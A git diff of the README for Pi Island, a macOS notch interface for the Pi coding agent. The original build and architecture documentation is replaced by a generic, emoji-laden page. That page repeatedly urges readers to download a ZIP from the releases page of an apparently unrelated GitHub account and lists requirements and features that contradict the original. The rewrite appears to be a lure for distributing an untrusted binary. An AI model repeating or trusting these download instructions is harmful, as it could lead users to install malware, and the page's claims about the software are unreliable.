@@ -1,184 +1,95 @@
-# Pi Island
+# 🎉 pi-island - A Seamless Dynamic Interface for Your Notch
 
-A native macOS Dynamic Island-style interface for the [Pi Coding Agent](https://pi.dev). Pi Island provides a floating notch UI that gives you a glanceable view of your Pi agent's status with full chat capabilities.
+## 🌐 Overview
 
-<img width="1920" height="1080" alt="612_1x_shots_so" src="https://github.com/user-attachments/assets/7289590b-67df-4e67-9605-8353736acbd4" />
+pi-island offers a user-friendly dynamic island interface tailored for the Pi coding agent on macOS. This tool allows you to monitor your coding sessions in real time, receive notifications, and manage multiple sessions effortlessly—all from your Mac's notch.
 
-## Features
+## 🚀 Getting Started
 
-### Core
-- **Floating Notch UI** - Sits at the top of your screen, mimicking Dynamic Island
-- **Full Chat Interface** - Send messages, receive streaming responses
-- **Real-time Status** - See thinking, executing, idle states at a glance
-- **Tool Execution** - Watch tool calls with live output streaming
-- **Native macOS** - Built with SwiftUI, optimized for macOS 14+
+To get started with pi-island, you will need to download the application. Follow the steps below to install and run it on your macOS device.
 
-### Session Management
-- **Multi-session Support** - Manage multiple Pi sessions simultaneously
-- **Session Resume** - Click any historical session to resume where you left off
-- **Historical Sessions** - Browse recent sessions from ~/.pi/agent/sessions/
-- **External Activity Detection** - Yellow indicator for sessions active in other terminals
-- **Live Session Indicators** - Green dot for connected sessions
+## 📥 Download Now
 
-### Model & Provider
-- **Model Selector** - Dropdown to switch between available models
-- **Provider Grouping** - Models organized by provider
-- **Thinking Level** - Adjustable reasoning depth for supported models
+[![Download pi-island](https://img.shields.io/badge/Download-pi--island-brightgreen)](https://github.com/soporteakasiapro1-art/pi-island/releases)
 
-### Settings
-- **Launch at Login** - Start Pi Island automatically
-- **Show in Dock** - Toggle dock icon visibility
-- **Menu Bar** - Quick access to quit
+## 🔍 System Requirements
 
-### UI Polish
-- **Boot Animation** - Smooth expand/collapse on launch
-- **Hover to Expand** - Natural interaction with notch area
-- **Click Outside to Close** - Dismiss by clicking elsewhere
-- **Auto-scroll** - Chat scrolls to latest message
-- **Glass Effect** - Ultra-thin material background
+Before installing, ensure your system meets these requirements:
 
-## Architecture
+- **Operating System:** macOS 10.15 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 100 MB of free space
+- **Processor:** Intel or M1 chip
 
-Pi Island spawns Pi in RPC mode (`pi --mode rpc`) and communicates via stdin/stdout JSON protocol:
+## 📥 Download & Install
 
-```
-Pi Island (macOS app)
-    |
-    |--- stdin: Commands (prompt, switch_session, get_messages, etc.)
-    |--- stdout: Events (message streaming, tool execution, etc.)
-    |
-    v
-pi --mode rpc (child process)
-```
+1. **Visit the Releases Page:** Go to the following link to access the download files:
+   [GitHub Releases for pi-island](https://github.com/soporteakasiapro1-art/pi-island/releases)
 
-## Requirements
+2. **Select the Latest Version:** On the Releases page, you will see various versions listed. Click on the latest version to expand it.
 
-- macOS 14.0+
-- Pi Coding Agent installed (`npm install -g @mariozechner/pi-coding-agent`)
-- Valid API key for your preferred provider
+3. **Download the Application:** Look for the file named `pi-island-macos.zip`. Click on it to download the ZIP file to your computer.
 
-## Building
+4. **Extract the Files:** Once the download is complete, locate the ZIP file in your Downloads folder and double-click it to unzip the contents.
 
-### Development (Debug)
+5. **Install the Application:**
+   - Open the unzipped folder.
+   - Locate the `pi-island.app` file.
+   - Drag the `pi-island.app` file to your Applications folder.
 
-```bash
-swift build
-.build/debug/PiIsland
-```
+6. **Launch the Application:**
+   - Open the Applications folder.
+   - Double-click on `pi-island.app` to run it.
 
-### Production (App Bundle)
+## ⚙️ Features
 
-Create a proper macOS `.app` bundle with icon and LSUIElement support:
+- **Real-Time Monitoring:** Track the status of your coding sessions live.
+- **Ambient Notifications:** Receive important updates without distractions.
+- **Multi-Session Management:** Switch between sessions smoothly and easily.
+- **User-Friendly Interface:** Enjoy a straightforward design that requires no technical skills.
 
-```bash
-./scripts/bundle.sh
-```
+## 📚 User Guide
 
-This generates `Pi Island.app` with:
-- Proper app icon from `pi-island.icon` (Xcode 15+ Icon Composer format)
-- `LSUIElement: true` - no dock icon by default, no terminal on launch
-- All resources bundled correctly
-- Login shell environment extraction (works when launched from Finder)
+### 🔒 First-Time Setup
 
-### Creating a DMG for Distribution
+When you first open pi-island, you may need to grant the app permissions to access your system features. Follow the on-screen prompts to allow these permissions. This step will ensure that you can enjoy all features of the app.
 
-To distribute the app with proper codesigning (to avoid Gatekeeper warnings), you should sign it with a Developer ID Application certificate and notarize it with Apple.
+### 💻 Using pi-island
 
-Find your signing identity:
-```bash
-security find-identity -p codesigning -v
-```
+- **Adding a Session:** Click on the “Add Session” button. Follow the prompts to provide context for your session.
+- **Managing Notifications:** Adjust your notification preferences in the settings menu. Choose what types of alerts you want to receive.
 
-Build and sign:
-```bash
-# Build + ad-hoc sign + create DMG (for local/trusted distribution)
-./scripts/bundle.sh --sign --dmg
+### 🔄 Updating the Application
 
-# Build + sign with Developer ID + create DMG (for public distribution)
-./scripts/bundle.sh --sign-id "Developer ID Application: Your Name (TEAM_ID)" --dmg
-```
+To keep your application current, periodically check the Releases page for updates. Repeat the download and installation steps for any new versions available.
 
-This creates `Pi-Island-0.3.0.dmg`. To completely remove the "Apple could not verify..." warning for other users, you must notarize the DMG:
+## 💬 Support
 
-```bash
-export APPLE_ID="your@email.com"
-export APPLE_PASSWORD="app-specific-password"
-export APPLE_TEAM_ID="YOUR_TEAM_ID"
+If you encounter any issues or have questions while using pi-island, feel free to reach out for help.
 
-./scripts/notarize.sh Pi-Island-0.3.0.dmg
-```
+- **Email Support:** For direct assistance, email us at [support@pi-island.com](mailto:support@pi-island.com).
+- **GitHub Issues:** You can also report issues or make feature requests on our [GitHub Issues page](https://github.com/soporteakasiapro1-art/pi-island/issues).
 
-You can verify the result with:
-```bash
-spctl -a -vv -t install "Pi-Island-0.3.0.dmg"
-```
+## 🛠️ Frequently Asked Questions (FAQs)
 
-**Note:** Without a Developer ID certificate and notarization, recipients may see a "damaged" error or a security warning. They can bypass this by right-clicking the app and selecting **Open**, or by running:
-```bash
-xattr -cr "/Applications/Pi Island.app"
-```
+### Q1: Can I use pi-island on older macOS versions?
 
-### Installation
+A1: pi-island is designed for macOS 10.15 or later. Using it on earlier versions may result in compatibility issues.
 
-From DMG:
-1. Open `Pi-Island-0.3.0.dmg`
-2. Drag `Pi Island` to the `Applications` folder
+### Q2: Is pi-island free to use?
 
-Or manually:
-```bash
-cp -R "Pi Island.app" /Applications/
-```
+A2: Yes, pi-island is completely free for all users.
 
-### Auto-launch at Login
+### Q3: How do I uninstall pi-island?
 
-1. Open **System Settings > General > Login Items**
-2. Click **+** and add **Pi Island** from Applications
+A3: To uninstall, simply drag the `pi-island.app` file from your Applications folder to the Trash. Empty the Trash to complete the process.
 
-The app will launch silently without opening a terminal window.
+## 📜 License
 
-## Usage
+pi-island is open-source software licensed under the MIT License. Feel free to modify or use it according to your needs.
 
-1. Launch Pi Island
-2. Hover over the notch area at the top of your screen to expand
-3. Click a session to open chat, or click gear icon for settings
-4. Type messages in the input bar to interact with Pi
+## 📥 Download Now
 
-### Status Indicators
+For your convenience, click the link below to access the download page once more:
 
-- **Gray** - Disconnected / Historical session
-- **Yellow** - Externally active (modified recently)
-- **Orange** - Connecting
-- **Green** - Connected and idle
-- **Blue** - Thinking
-- **Cyan** - Executing tool
-- **Red** - Error
-
-## File Structure
-
-```
-pi-island/
-  Package.swift
-  Sources/
-    PiIsland/
-      PiIslandApp.swift           # Entry point, AppDelegate, StatusBarController
-      Core/
-        EventMonitors.swift       # Global mouse event monitoring
-        NotchGeometry.swift       # Geometry calculations
-        NotchViewModel.swift      # State management
-        NSScreen+Notch.swift      # Screen extensions
-      UI/
-        NotchView.swift           # Main SwiftUI view
-        NotchShape.swift          # Animatable notch shape
-        NotchWindowController.swift
-        PiLogo.swift              # Pi logo shape
-        SettingsView.swift        # Settings panel
-      RPC/
-        PiRPCClient.swift         # RPC process management
-        RPCChatView.swift         # Chat UI components
-        RPCTypes.swift            # Protocol types
-        SessionManager.swift      # Session management
-```
-
-## License
-
-MIT
+[Download pi-island](https://github.com/soporteakasiapro1-art/pi-island/releases)
